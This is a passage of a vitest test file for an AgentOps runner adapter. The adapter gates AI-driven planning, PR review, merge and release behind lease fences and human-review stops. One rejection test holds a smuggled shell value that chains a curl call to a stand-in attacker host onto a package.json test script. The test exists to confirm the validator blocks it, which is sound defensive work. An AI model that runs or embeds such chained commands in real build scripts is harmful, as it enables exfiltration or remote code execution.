import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  EvalRun,
  GithubIssueSnapshot,
  Issue,
  PR,
  PrRevision,
} from '../src/domain/schema.js';
import { Store } from '../src/store/store.js';
import { findingsPath } from '../src/pipeline/execution/perspective-session.js';
import { PANEL_ESCALATION_PERSPECTIVE } from '../src/pipeline/panel.js';
import type { PostgresControlStore } from '../src/control-store/store.js';
import type {
  ExecutionGuardVerdict,
  Lease,
  RunnerCriticalBoundary,
  RunnerJobPayloadV1,
} from '../src/control-store/types.js';
import { releaseSourceIssueSnapshotDigest } from '../src/control-store/types.js';
import {
  hasDurableCurrentHeadRequestChanges,
  hasDurableCurrentHeadReviewStop,
  ExistingAgentOpsRunnerAdapter,
  inferRepositoryGraders,
  repositoryGraderProfileEvidence,
} from '../src/runner/adapter.js';
import { RunnerLeaseFence } from '../src/runner/guard.js';

const roots: string[] = [];
afterEach(() => {
  delete process.env.AGENTOPS_RUNNER_REGISTRATION_ROOT;
  delete process.env.AGENTOPS_RUNNER_DEPENDENCY_ROOT;
  while (roots.length > 0) {
    fs.rmSync(roots.pop()!, { recursive: true, force: true });
  }
});

const registrationId = 'ca3126a8-b83f-4698-90af-462523880c20';
const jobId = 'db837db2-30d7-4788-a56f-00056f5d550e';

function payload(): RunnerJobPayloadV1 {
  return {
    schemaVersion: 1,
    repository: { owner: 'mrbaron3', name: 'servo' },
    event: { kind: 'issue', number: 14, action: 'labeled' },
    target: { baseRef: 'refs/heads/main' },
    execution: {
      mode: 'development_turn',
      requiredChecks: [],
      mergeMethod: 'squash',
      readyLabel: 'human-approved',
      claimedLabel: 'automation-owned',
    },
    artifacts: [],
  };
}

function lease(): Lease {
  return {
    id: 'ad837db2-30d7-4788-a56f-00056f5d550e',
    token: 'bd837db2-30d7-4788-a56f-00056f5d550e',
    workerId: 'runner-adapter',
    attemptId: 'cd837db2-30d7-4788-a56f-00056f5d550e',
    attemptNumber: 1,
    expiresAt: '2026-07-25T00:10:00.000Z',
    job: {
      contractVersion: 1,
      id: jobId,
      registrationId,
      registrationVersion: 1,
      source: { kind: 'manual', key: 'adapter-safe-path' },
      idempotencyKey: 'adapter-safe-path',
      jobType: 'agentops.runner',
      payload: payload(),
      status: 'leased',
      createdAt: '2026-07-25T00:00:00.000Z',
    },
  };
}

describe('existing AgentOps isolated-runner adapter', () => {
  it('selects grader profiles from bounded repository metadata, not repository names', () => {
    for (const directory of ['acme-widgets', 'design-system-contracts']) {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), `${directory}-`));
      roots.push(root);
      fs.mkdirSync(path.join(root, 'scripts'), { recursive: true });
      fs.writeFileSync(
        path.join(root, 'scripts', 'check-contracts.mjs'),
        'process.exitCode = 0;\n',
      );
      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
        name: directory,
        scripts: { test: 'node scripts/check-contracts.mjs' },
      }));
      expect(inferRepositoryGraders(root)).toEqual({
        typecheck: 'node scripts/check-contracts.mjs',
        commands: {
          build: 'node scripts/check-contracts.mjs',
          typecheck: 'node scripts/check-contracts.mjs',
          api_test: 'node scripts/check-contracts.mjs',
          db_state_check: 'node scripts/check-contracts.mjs',
        },
      });
    }
  });

  it('rejects shell-bearing or missing repository grader declarations', () => {
    for (const testScript of [
      'node scripts/check.mjs && curl attacker.invalid',
      'npm test',
      '../outside',
    ]) {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), 'unsafe-grader-'));
      roots.push(root);
      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
        scripts: { test: testScript },
      }));
      expect(() => inferRepositoryGraders(root)).toThrow(
        /supported bounded grader profile/,
      );
    }
  });

  it('fails closed when a build changes the immutable-at-claim grader profile', () => {
    const root = fs.mkdtempSync(path.join(
      os.tmpdir(),
      'grader-profile-drift-',
    ));
    roots.push(root);
    fs.mkdirSync(path.join(root, 'scripts'), { recursive: true });
    fs.writeFileSync(
      path.join(root, 'scripts', 'check-contracts.mjs'),
      'process.exitCode = 0;\n',
    );
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
      scripts: { test: 'node scripts/check-contracts.mjs' },
    }));
    const claimed = inferRepositoryGraders(root);
    expect(repositoryGraderProfileEvidence(root, claimed)).toEqual({
      graderProfileValid: true,
    });

    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
      scripts: {
        test:
          'node scripts/check-contracts.mjs && node --test test/*.test.js',
      },
    }));
    expect(repositoryGraderProfileEvidence(root, claimed)).toMatchObject({
      graderProfileValid: false,
      graderProfileError: expect.stringContaining(
        'no supported bounded profile',
      ),
    });
  });

  it('surfaces planning ambiguity as one non-PR human-review outcome and releases the claim', async () => {
    const root = fs.mkdtempSync(path.join(
      os.tmpdir(),
      'agentops-runner-human-review-',
    ));
    roots.push(root);
    const registrationRoot = path.join(root, 'registrations', registrationId);
    const worktreePath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'worktree',
    );
    const statePath = path.join(registrationRoot, 'jobs', jobId, 'state');
    const artifactPath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'artifacts',
    );
    fs.mkdirSync(worktreePath, { recursive: true });
    fs.mkdirSync(artifactPath, { recursive: true });
    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
      devDependencies: {
        typescript: '^5.6.2',
        vitest: '^3.2.7',
      },
    }));

    const boundaries: RunnerCriticalBoundary[] = [];
    const progressEvents: Array<Record<string, unknown>> = [];
    const guardStore = {
      async assertExecutionGuard(
        input: { boundary: RunnerCriticalBoundary },
      ) {
        boundaries.push(input.boundary);
        return {
          ok: true,
          reason: null,
          registration: null,
          jobId,
          leaseExpiresAt: '2026-07-25T00:10:00.000Z',
        };
      },
      async recordDevelopmentProgress(input: { event: Record<string, unknown> }) {
        progressEvents.push(input.event);
        return progressEvents.length;
      },
    } as unknown as PostgresControlStore;
    const issue = GithubIssueSnapshot.parse({
      repository: 'mrbaron3/servo',
      number: 14,
      externalId: 'I_14',
      title: 'Choose policy boundaries',
      body: 'Users need a human decision before implementation.',
      url: 'https://github.com/mrbaron3/servo/issues/14',
      labels: ['human-approved'],
      state: 'open',
      sourceUpdatedAt: '2026-07-25T00:00:00.000Z',
      snapshotAt: '2026-07-25T00:00:01.000Z',
    });
    const ambiguities = [
      'Specify conflict behavior',
      'Choose the retention window',
      'Confirm actor permissions',
      'Define the compatibility floor',
      'Decide audit visibility',
    ];
    const sideEffects: string[] = [];
    let managedBody = '';
    const adapter = new ExistingAgentOpsRunnerAdapter({
      issueRunner: () => ({
        listReadyIssues: () => [issue],
        claimIssue: () => {
          sideEffects.push('claim');
        },
      }),
      planningHumanReviewGithub: () => ({
        ensureManagedComment(repository, issueNumber, comment) {
          sideEffects.push(`comment:${repository}#${issueNumber}`);
          managedBody = comment.body;
          return 'https://github.com/mrbaron3/servo/issues/14#issuecomment-1';
        },
        removeClaimedLabel(repository, issueNumber, claimedLabel) {
          sideEffects.push(
            `remove:${repository}#${issueNumber}:${claimedLabel}`,
          );
        },
      }),
      planningRunner: async () => ({
        provider: 'codex',
        model: null,
        prompt: 'ambiguous planning fixture',
        outcome: 'completed',
        output: {
          candidates: [{
            candidateKey: 'policy-boundaries',
            title: 'Implement policy boundaries',
            type: 'feature',
            area: 'backend',
            contract: {
              productGoal: 'Apply the selected policy',
              userStory: 'As a user I get deterministic policy behavior',
              scope: { include: ['src/**'], exclude: [] },
              acceptanceCriteria: [{
                id: 'AC-POLICY-001',
                severity: 'blocker',
                behavior: 'The selected policy is applied',
                verification: {
                  method: 'unit_test',
                  expected: ['selected policy is applied'],
                },
              }],
              redLines: [],
            },
            traces: [{
              criterionId: 'AC-POLICY-001',
              sources: [{ kind: 'source', text: 'human decision' }],
            }],
          }],
          ambiguities,
        },
      }),
      generatorSession: async () => {
        throw new Error('generator must not run after planning ambiguity');
      },
    });
    const activeLease = lease();
    const result = await adapter.execute({
      lease: activeLease,
      payload: payload(),
      workspace: {
        registrationRoot,
        repositoryPath: path.join(registrationRoot, 'repository.git'),
        worktreePath,
        harnessPath: path.join(registrationRoot, 'jobs', jobId, 'attempt-1', 'harness'),
        statePath,
        artifactPath,
        headSha: 'a'.repeat(40),
      },
      fence: new RunnerLeaseFence(
        guardStore,
        activeLease,
        activeLease.workerId,
        60_000,
      ),
      provider: 'codex',
      controlStore: guardStore,
      log: () => {},
    });

    expect(result).toMatchObject({
      outcome: 'needs-human-review',
      headSha: null,
      pullRequestNumber: null,
      humanReview: {
        issueNumber: 14,
        reasons: ambiguities.map((ambiguity) =>
          `planning ambiguity: ${ambiguity}`),
      },
    });
    expect(process.env.AGENTOPS_RUNNER_DEPENDENCY_ROOT)
      .toBe('/app/node_modules');
    expect(sideEffects).toEqual([
      'claim',
      'comment:mrbaron3/servo#14',
      'remove:mrbaron3/servo#14:automation-owned',
    ]);
    for (const ambiguity of ambiguities) {
      expect(managedBody).toContain(`planning ambiguity: ${ambiguity}`);
    }
    expect(managedBody).toContain(
      'AgentOps はこの停止では `human-approved` を付けません。',
    );
    expect(boundaries.filter((boundary) => boundary === 'release'))
      .toHaveLength(2);
    const persisted = new Store(statePath);
    expect(persisted.db.intakeRecords[0]?.status)
      .toBe('needs-human-review');
    expect(persisted.db.planningEnrichments[0]?.status)
      .toBe('needs-human-review');
    expect(persisted.db.prs).toHaveLength(0);
    expect(progressEvents).toEqual(expect.arrayContaining([
      expect.objectContaining({
        eventKey: 'lease-a1:intake:runner-start',
        phase: 'intake',
        worktreePath,
      }),
      expect.objectContaining({
        eventKey: 'lease-a1:planning:start',
        phase: 'planning',
        state: 'running',
      }),
      expect.objectContaining({
        eventKey: 'lease-a1:human-review:planning',
        phase: 'human-review',
        state: 'blocked',
      }),
    ]));
  });

  it('recognizes a durable current-head request after reconciliation reopens the PR', () => {
    const root = fs.mkdtempSync(path.join(
      os.tmpdir(),
      'agentops-runner-request-changes-',
    ));
    roots.push(root);
    const store = new Store(root);
    const now = '2026-07-25T00:00:00.000Z';
    const headSha = 'a'.repeat(40);
    const issue = store.addIssue(Issue.parse({
      id: 'ISSUE-PR-38',
      type: 'feature',
      title: 'Review current head',
      area: 'backend',
      status: 'changes-requested',
      assignedAgent: 'codex',
      contract: {
        productGoal: 'Review safely',
        userStory: 'As a maintainer I receive current-head review',
        scope: { include: [], exclude: [] },
        acceptanceCriteria: [{
          id: 'AC-PR-001',
          severity: 'blocker',
          behavior: 'The current head is safe',
          verification: {
            method: 'scope_check',
            expected: ['no protected paths change'],
          },
        }],
        redLines: [],
      },
      createdAt: now,
      updatedAt: now,
    }));
    const revision = store.upsertPrRevision(PrRevision.parse({
      id: 'PRREV-38-1',
      prId: 'PR-38',
      headSha,
      ordinal: 1,
      status: 'reviewing',
      createdAt: now,
    }));
    const pr = store.addPR(PR.parse({
      id: revision.prId,
      issueId: issue.id,
      branch: 'feature/review',
      generator: 'codex',
      status: 'open',
      currentRevisionId: revision.id,
      headSha,
      externalRef: {
        provider: 'github',
        repository: 'mrbaron3/servo',
        number: 38,
        url: 'https://github.com/mrbaron3/servo/pull/38',
      },
      createdAt: now,
      updatedAt: now,
    }));
    store.db.evalRuns.push(EvalRun.parse({
      id: 'EVAL-PR-38',
      issueId: issue.id,
      prId: pr.id,
      attempt: 1,
      sampleIndex: 0,
      agent: 'codex',
      verdict: 'request_changes',
      hardGates: { scope_check: 'fail' },
      findings: [],
      scores: {
        functionality: 0,
        codeQuality: 0,
        testQuality: 0,
        ux: 0,
        accessibility: 0,
      },
      overall: 0,
      cost: {},
      revisionId: revision.id,
      headSha,
      createdAt: now,
    }));

    expect(hasDurableCurrentHeadRequestChanges(store, pr)).toBe(true);
    store.db.evalRuns[0]!.verdict = 'approve';
    expect(hasDurableCurrentHeadRequestChanges(store, pr)).toBe(false);
    expect(hasDurableCurrentHeadReviewStop(store, pr)).toBe(false);
    store.replacePrRevision(PrRevision.parse({
      ...revision,
      status: 'failed',
      completedAt: now,
    }));
    expect(hasDurableCurrentHeadReviewStop(store, pr)).toBe(false);
    store.setStatus(issue.id, 'needs-human-review');
    expect(hasDurableCurrentHeadReviewStop(store, pr)).toBe(false);
    store.db.evalRuns.push(EvalRun.parse({
      ...store.db.evalRuns[0]!,
      id: 'EVAL-PR-38-ESCALATED',
      perspective: PANEL_ESCALATION_PERSPECTIVE,
      verdict: 'needs_human',
    }));
    expect(hasDurableCurrentHeadReviewStop(store, pr)).toBe(true);
  });

  it('completes a legacy merged release without mutable epic inference and surfaces the manual gate', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agentops-legacy-merged-'));
    roots.push(root);
    const registrationRoot = path.join(root, 'registrations', registrationId);
    const worktreePath = path.join(registrationRoot, 'jobs', jobId, 'attempt-1', 'worktree');
    const statePath = path.join(registrationRoot, 'jobs', jobId, 'state');
    const artifactPath = path.join(registrationRoot, 'jobs', jobId, 'attempt-1', 'artifacts');
    fs.mkdirSync(worktreePath, { recursive: true });
    fs.mkdirSync(artifactPath, { recursive: true });
    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
      devDependencies: { typescript: '^5.6.2', vitest: '^3.2.7' },
    }));
    const headSha = 'a'.repeat(40);
    const releaseId = 'eb837db2-30d7-4788-a56f-00056f5d550e';
    const activeLease = lease();
    activeLease.job.releaseId = releaseId;
    const progress: Array<Record<string, unknown>> = [];
    let issueReads = 0;
    let epicInventoryReads = 0;
    const controlStore = {
      getRelease: async () => ({
        id: releaseId,
        registrationId,
        releaseKey: 'issue:14:legacy',
        repository: 'mrbaron3/servo',
        issueNumber: 14,
        policy: {
          authority: 'human-ready-allowed',
          requiredGateSignals: [{ source: 'github-check', name: 'test' }],
          requiredReviewPerspectives: ['security', 'codeQuality'],
          minimumHeadEpochs: 1,
        },
        status: 'merged',
        pullRequest: 38,
        finalHead: headSha,
        mergeSha: 'b'.repeat(40),
        mergeActor: { type: 'human', login: 'merger' },
        createdAt: '2026-07-20T00:00:00.000Z',
        updatedAt: '2026-07-21T00:00:00.000Z',
        completedAt: '2026-07-21T00:00:00.000Z',
      }),
      getReleaseSourceIssue: async () => null,
      recordDevelopmentProgress: async ({ event }: { event: Record<string, unknown> }) => {
        progress.push(event);
        return progress.length;
      },
    } as unknown as PostgresControlStore;
    const guardStore = {
      assertExecutionGuard: async () => ({
        ok: true,
        reason: null,
        registration: null,
        jobId,
        leaseExpiresAt: activeLease.expiresAt,
      }),
    } as unknown as PostgresControlStore;
    const adapter = new ExistingAgentOpsRunnerAdapter({
      issueRunner: () => ({
        listReadyIssues: () => {
          issueReads += 1;
          return [];
        },
        claimIssue: () => { throw new Error('merged release must not reclaim the Issue'); },
      }),
      prNativeRunner: () => ({
        viewRevision: () => { throw new Error('merged release must not be reviewed again'); },
        merge: () => { throw new Error('merged release must not be merged again'); },
        closeIssue: () => { throw new Error('legacy source must not close a mutable parent'); },
        listRepositoryIssues: () => {
          epicInventoryReads += 1;
          return [];
        },
      }),
    });

    const result = await adapter.execute({
      lease: activeLease,
      payload: payload(),
      workspace: {
        registrationRoot,
        repositoryPath: path.join(registrationRoot, 'repository.git'),
        worktreePath,
        harnessPath: path.join(registrationRoot, 'jobs', jobId, 'attempt-1', 'harness'),
        statePath,
        artifactPath,
        headSha,
      },
      fence: new RunnerLeaseFence(guardStore, activeLease, activeLease.workerId, 60_000),
      provider: 'codex',
      controlStore,
      releaseRuntime: {
        consumer: { repository: 'mrbaron3/servo', revision: 'c'.repeat(40) },
        environment: {
          kind: 'container',
          reference: 'legacy-test',
          digest: `sha256:${'d'.repeat(64)}`,
        },
        providerDefaults: [],
      },
      log: () => {},
    });

    expect(result).toMatchObject({
      outcome: 'completed',
      headSha,
      pullRequestNumber: 38,
    });
    expect(issueReads).toBe(0);
    expect(epicInventoryReads).toBe(0);
    expect(progress).toEqual(expect.arrayContaining([
      expect.objectContaining({
        step: 'parent Issue auto-close skipped',
        state: 'blocked',
        worktreePath: null,
      }),
      expect.objectContaining({
        step: 'implementation released',
        state: 'succeeded',
        nextGate: expect.stringContaining('human manually reconciles'),
      }),
    ]));
  });

  it('retries frozen-source Epic close for an already merged release', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agentops-frozen-merged-'));
    roots.push(root);
    const registrationRoot = path.join(root, 'registrations', registrationId);
    const attemptRoot = path.join(registrationRoot, 'jobs', jobId, 'attempt-1');
    const worktreePath = path.join(attemptRoot, 'worktree');
    const harnessPath = path.join(attemptRoot, 'harness');
    const statePath = path.join(registrationRoot, 'jobs', jobId, 'state');
    const artifactPath = path.join(attemptRoot, 'artifacts');
    fs.mkdirSync(worktreePath, { recursive: true });
    fs.mkdirSync(harnessPath, { recursive: true });
    fs.mkdirSync(artifactPath, { recursive: true });
    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
      devDependencies: { typescript: '^5.6.2', vitest: '^3.2.7' },
    }));
    const headSha = 'a'.repeat(40);
    const releaseId = 'eb837db2-30d7-4788-a56f-00056f5d550e';
    const activeLease = lease();
    activeLease.job.releaseId = releaseId;
    const sourceCore = {
      repository: 'mrbaron3/servo',
      number: 14,
      title: '[DF-002] phase',
      body: 'Parent: #1',
      url: 'https://github.com/mrbaron3/servo/issues/14',
      labels: ['human-approved'],
      comments: [],
      state: 'open' as const,
      sourceUpdatedAt: '2026-07-20T00:00:00.000Z',
      capturedAt: '2026-07-20T00:00:01.000Z',
    };
    const sourceIssue = {
      ...sourceCore,
      digest: releaseSourceIssueSnapshotDigest(sourceCore),
    };
    const progress: Array<Record<string, unknown>> = [];
    const closed: number[] = [];
    let inventories = 0;
    const controlStore = {
      getRelease: async () => ({
        id: releaseId,
        registrationId,
        releaseKey: 'issue:14:frozen',
        repository: 'mrbaron3/servo',
        issueNumber: 14,
        policy: {
          authority: 'human-ready-allowed',
          requiredGateSignals: [{ source: 'github-check', name: 'test' }],
          requiredReviewPerspectives: ['security', 'codeQuality'],
          minimumHeadEpochs: 1,
        },
        status: 'merged',
        pullRequest: 38,
        finalHead: headSha,
        mergeSha: 'b'.repeat(40),
        mergeActor: { type: 'human', login: 'merger' },
        createdAt: '2026-07-20T00:00:00.000Z',
        updatedAt: '2026-07-21T00:00:00.000Z',
        completedAt: '2026-07-21T00:00:00.000Z',
      }),
      getReleaseSourceIssue: async () => sourceIssue,
      recordDevelopmentProgress: async ({ event }: { event: Record<string, unknown> }) => {
        progress.push(event);
        return progress.length;
      },
      assertExecutionGuard: async () => ({
        ok: true,
        reason: null,
        registration: null,
        jobId,
        leaseExpiresAt: activeLease.expiresAt,
      }),
    } as unknown as PostgresControlStore;
    const inventory = [
      {
        number: 1,
        title: 'Epic',
        body: 'DF-002',
        authorLogin: 'owner',
        subIssueNumbers: [],
        state: 'open' as const,
        stateReason: null,
      },
      {
        number: 14,
        title: '[DF-002] phase',
        body: 'Parent: #1',
        authorLogin: 'owner',
        subIssueNumbers: [],
        state: 'closed' as const,
        stateReason: 'completed' as const,
      },
    ];
    const adapter = new ExistingAgentOpsRunnerAdapter({
      issueRunner: () => ({
        listReadyIssues: () => [],
        claimIssue: () => { throw new Error('merged release must not reclaim'); },
      }),
      prNativeRunner: () => ({
        viewRevision: () => { throw new Error('merged release must not review'); },
        merge: () => { throw new Error('merged release must not merge'); },
        closeIssue: (_cwd, _repository, number) => closed.push(number),
        listRepositoryIssues: () => {
          inventories += 1;
          return inventory;
        },
      }),
    });

    const result = await adapter.execute({
      lease: activeLease,
      payload: payload(),
      workspace: {
        registrationRoot,
        repositoryPath: path.join(registrationRoot, 'repository.git'),
        worktreePath,
        harnessPath,
        statePath,
        artifactPath,
        headSha,
      },
      fence: new RunnerLeaseFence(controlStore, activeLease, activeLease.workerId, 60_000),
      provider: 'codex',
      controlStore,
      releaseRuntime: {
        consumer: { repository: 'mrbaron3/servo', revision: 'c'.repeat(40) },
        environment: {
          kind: 'container',
          reference: 'frozen-test',
          digest: `sha256:${'d'.repeat(64)}`,
        },
        providerDefaults: [],
      },
      log: () => {},
    });

    expect(result).toMatchObject({ outcome: 'completed', headSha, pullRequestNumber: 38 });
    expect(inventories).toBe(2);
    expect(closed).toEqual([1]);
    expect(progress).toEqual(expect.arrayContaining([
      expect.objectContaining({
        step: 'parent Issue #1 closed',
        state: 'succeeded',
        parentIssueNumber: 1,
      }),
      expect.objectContaining({ step: 'implementation released', state: 'succeeded' }),
    ]));
  });

  it('drives planning, PR-native review, checks, expected-SHA merge, and release through every fence', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agentops-runner-adapter-'));
    roots.push(root);
    const registrationRoot = path.join(root, 'registrations', registrationId);
    const worktreePath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'worktree',
    );
    const statePath = path.join(registrationRoot, 'jobs', jobId, 'state');
    const artifactPath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'artifacts',
    );
    fs.mkdirSync(worktreePath, { recursive: true });
    fs.mkdirSync(artifactPath, { recursive: true });
    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
      devDependencies: {
        typescript: '^5.6.2',
        vitest: '^3.2.7',
      },
    }));

    const boundaries: RunnerCriticalBoundary[] = [];
    const headSha = 'a'.repeat(40);
    const releaseId = 'eb837db2-30d7-4788-a56f-00056f5d550e';
    const progress: Array<Record<string, unknown>> = [];
    const sourceCore = {
      repository: 'mrbaron3/servo',
      number: 14,
      title: '[DF-002] Add safe path',
      body: 'Parent: #1\n\nUsers need the safe path.',
      url: 'https://github.com/mrbaron3/servo/issues/14',
      labels: ['human-approved'],
      comments: [],
      state: 'open' as const,
      sourceUpdatedAt: '2026-07-25T00:00:00.000Z',
      capturedAt: '2026-07-25T00:00:01.000Z',
    };
    const frozenSourceIssue = {
      ...sourceCore,
      digest: releaseSourceIssueSnapshotDigest(sourceCore),
    };
    const receipts: Array<Record<string, unknown>> = [{
      receiptId: 'fb837db2-30d7-4788-a56f-00056f5d550e',
      receiptKey: 'authority:human-ready',
      kind: 'authority',
      recordedAt: '2026-07-25T00:00:02.000Z',
    }];
    const authorizationInputs: Array<Record<string, unknown>> = [];
    const completionInputs: Array<Record<string, unknown>> = [];
    const pullRequestBindings: Array<Record<string, unknown>> = [];
    const verdict: ExecutionGuardVerdict = {
      ok: true,
      reason: null,
      registration: null,
      jobId,
      leaseExpiresAt: '2026-07-25T00:10:00.000Z',
    };
    const guardStore = {
      async assertExecutionGuard(input: { boundary: RunnerCriticalBoundary }) {
        boundaries.push(input.boundary);
        return verdict;
      },
      async getRelease() {
        return {
          id: releaseId,
          registrationId,
          releaseKey: 'issue:14:normal-close',
          repository: 'mrbaron3/servo',
          issueNumber: 14,
          policy: {
            authority: 'human-ready-allowed',
            requiredGateSignals: [],
            requiredReviewPerspectives: [],
            minimumHeadEpochs: 1,
          },
          status: 'collecting',
          pullRequest: null,
          finalHead: null,
          mergeSha: null,
          mergeActor: null,
          createdAt: '2026-07-25T00:00:00.000Z',
          updatedAt: '2026-07-25T00:00:01.000Z',
          completedAt: null,
        };
      },
      async getReleaseSourceIssue() { return frozenSourceIssue; },
      async bindReleasePullRequest(input: Record<string, unknown>) {
        pullRequestBindings.push(input);
      },
      async listReleaseReceipts() {
        return receipts.map((receipt) => ({ receipt }));
      },
      async recordReleaseReceipt(receipt: Record<string, unknown>) {
        if (!receipts.some((entry) => entry.receiptKey === receipt.receiptKey)) {
          receipts.push(receipt);
        }
      },
      async observeReleaseHead() { return 1; },
      async authorizeReleaseMerge(input: Record<string, unknown>) {
        authorizationInputs.push(input);
        receipts.push(input.intent as Record<string, unknown>);
      },
      async completeReleaseMerge(input: Record<string, unknown>) {
        completionInputs.push(input);
      },
      async recordDevelopmentProgress(input: { event: Record<string, unknown> }) {
        progress.push(input.event);
        return progress.length;
      },
    } as unknown as PostgresControlStore;
    const githubSideEffects: string[] = [];
    let githubMerged = false;
    const issue = GithubIssueSnapshot.parse({
      repository: 'mrbaron3/servo',
      number: 14,
      externalId: 'I_14',
      title: 'Add safe path',
      body: 'Users need the safe path.',
      url: 'https://github.com/mrbaron3/servo/issues/14',
      labels: ['human-approved'],
      state: 'open',
      sourceUpdatedAt: '2026-07-25T00:00:00.000Z',
      snapshotAt: '2026-07-25T00:00:01.000Z',
    });
    const adapter = new ExistingAgentOpsRunnerAdapter({
      issueRunner: () => ({
        listReadyIssues: () => [issue],
        claimIssue: () => {
          githubSideEffects.push('claim');
        },
      }),
      planningRunner: async () => ({
        provider: 'codex',
        model: null,
        prompt: 'safe planning fixture',
        outcome: 'completed',
        output: {
          candidates: [{
            candidateKey: 'safe-path',
            title: 'Implement safe path',
            type: 'feature',
            area: 'backend',
            contract: {
              productGoal: 'Safe path',
              userStory: 'As a user I use the safe path',
              scope: { include: ['src/**'], exclude: [] },
              acceptanceCriteria: [{
                id: 'AC-SAFE-001',
                severity: 'blocker',
                behavior: 'The safe path works',
                verification: {
                  method: 'unit_test',
                  expected: ['safe path works'],
                },
              }],
              redLines: [],
            },
            traces: [{
              criterionId: 'AC-SAFE-001',
              sources: [{ kind: 'source', text: 'safe path' }],
            }],
          }],
          ambiguities: [],
        },
      }),
      generatorSession: async () => ({
        provider: 'codex',
        model: null,
        worktree: worktreePath,
        branch: 'agent/issue-0001-s0',
        session: 'safe-generator',
        outcome: 'completed',
        changed: ['src/safe.ts'],
        headSha,
        paneTail: '',
        prompt: 'safe generator fixture',
      }),
      groundBuild: () => ({
        branch: 'agent/issue-0001-s0',
        summary: 'safe grounded fixture',
        filesChanged: ['src/safe.ts'],
        satisfied: { 'AC-SAFE-001': true, 'SOURCE-ISSUE': true },
        buildPasses: true,
        typecheckPasses: true,
        unitTestsPass: true,
        apiTestsPass: true,
        hasTests: true,
        secretsLeaked: false,
        scopeViolations: [],
        quality: {
          codeQuality: 1,
          testQuality: 1,
          ux: 1,
          accessibility: 1,
        },
        notes: [],
      }),
      regressReport: () => ({
        success: true,
        total: 1,
        passed: 1,
        failedNames: [],
        assertions: [{ name: 'AC-SAFE-001 safe path works', passed: true }],
      }),
      perspectiveSessions: async (_config, input) => {
        const evalRoot = path.join(input.worktree, '.agentops', 'eval');
        const reviewed = input.perspectives.filter((perspective) =>
          !perspective.deterministic);
        for (const perspective of reviewed) {
          const filename = findingsPath(evalRoot, perspective.key);
          fs.mkdirSync(path.dirname(filename), { recursive: true });
          fs.writeFileSync(filename, JSON.stringify({
            verdict: 'approve',
            score: 1,
            findings: [],
          }));
        }
        return {
          evalRoot,
          completed: reviewed.map((perspective) => perspective.key),
          touchedCode: [],
          environmentChanges: {},
          invocations: reviewed.map((perspective) => ({
            role: 'reviewer' as const,
            perspective: perspective.key,
            provider: 'codex' as const,
            model: null,
            prompt: `review ${perspective.key}`,
            outcome: 'completed' as const,
          })),
        };
      },
      gateRunner: () => ({
        preflightPr: (_cwd, args) => args.existingRef,
        pushBranch: () => {
          githubSideEffects.push('push');
        },
        createPr: () => {
          githubSideEffects.push('create-pr');
          return {
            provider: 'github',
            repository: 'mrbaron3/servo',
            number: 38,
            url: 'https://github.com/mrbaron3/servo/pull/38',
          };
        },
        viewPr: () => 'open',
      }),
      prNativeRunner: () => ({
        viewRevision: () => ({
          state: githubMerged ? 'merged' : 'open',
          headSha,
          isDraft: false,
          mergeability: 'mergeable',
          checks: [],
          unresolvedBlockingThreadIds: [],
          blockingReviewThreads: [],
        }),
        merge: (_cwd, number, expectedHeadSha) => {
          githubSideEffects.push(`merge:${number}:${expectedHeadSha}`);
          githubMerged = true;
        },
        closeIssue: (_cwd, _repository, number) => {
          githubSideEffects.push(`close-issue:${number}`);
        },
        listRepositoryIssues: () => [
          {
            number: 1,
            title: 'Epic',
            body: 'DF-002',
            authorLogin: 'owner',
            subIssueNumbers: [],
            state: 'open' as const,
            stateReason: null,
          },
          {
            number: 14,
            title: '[DF-002] Add safe path',
            body: 'Parent: #1',
            authorLogin: 'owner',
            subIssueNumbers: [],
            state: 'closed' as const,
            stateReason: 'completed' as const,
          },
        ],
        observeRelease: (_cwd, _repository, _issue, pullRequestNumber, expectedHead) => ({
          pullRequestNumber,
          expectedHead,
          observedPrHead: expectedHead,
          mergeSha: 'b'.repeat(40),
          actor: 'merger',
          sourceIssueClosure: 'completed' as const,
          mergeReachableFromDefaultBranch: true as const,
          mergedAt: '2026-07-25T00:10:00.000Z',
        }),
        listOpenPullRequests: () => [],
      }),
    });
    const activeLease = lease();
    activeLease.job.releaseId = releaseId;
    const result = await adapter.execute({
      lease: activeLease,
      payload: payload(),
      workspace: {
        registrationRoot,
        repositoryPath: path.join(registrationRoot, 'repository.git'),
        worktreePath,
        harnessPath: path.join(registrationRoot, 'jobs', jobId, 'attempt-1', 'harness'),
        statePath,
        artifactPath,
        headSha,
      },
      fence: new RunnerLeaseFence(
        guardStore,
        activeLease,
        activeLease.workerId,
        60_000,
      ),
      provider: 'codex',
      controlStore: guardStore,
      releaseRuntime: {
        consumer: { repository: 'mrbaron3/servo', revision: 'c'.repeat(40) },
        environment: {
          kind: 'container',
          reference: 'normal-close-test',
          digest: `sha256:${'d'.repeat(64)}`,
        },
        providerDefaults: [{
          provider: 'codex',
          reference: 'codex-default-test',
          resolverDigest: `sha256:${'e'.repeat(64)}`,
        }],
      },
      log: () => {},
    });

    expect(result).toMatchObject({
      headSha,
      pullRequestNumber: 38,
    });
    expect(result, JSON.stringify(result)).toMatchObject({ outcome: 'completed' });
    expect(githubSideEffects).toContain('push');
    expect(githubSideEffects).toContain('create-pr');
    expect(githubSideEffects).toContain(`merge:38:${headSha}`);
    expect(githubSideEffects).toContain('close-issue:1');
    expect(pullRequestBindings).toContainEqual(expect.objectContaining({
      releaseId,
